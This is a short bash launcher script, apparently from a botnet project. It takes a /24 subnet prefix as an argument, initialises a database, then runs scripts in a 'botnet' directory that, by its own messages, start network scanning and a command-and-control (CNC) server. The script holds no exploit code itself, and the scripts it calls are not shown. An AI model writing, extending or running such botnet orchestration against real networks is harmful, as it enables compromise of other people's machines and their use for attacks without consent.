#!/bin/bash

echo "Initializing the Database"

if [ $# -le 0 ]
then
	echo "please enter the IP ID in the form of x.x.x as an argument"
	echo "this program handles only /24 subnet values"
	exit 0
fi

./init.sh

echo ""
echo ""

echo "Starting the Scanning process and the CNC server"

cd botnet

echo $1

./run.sh $1


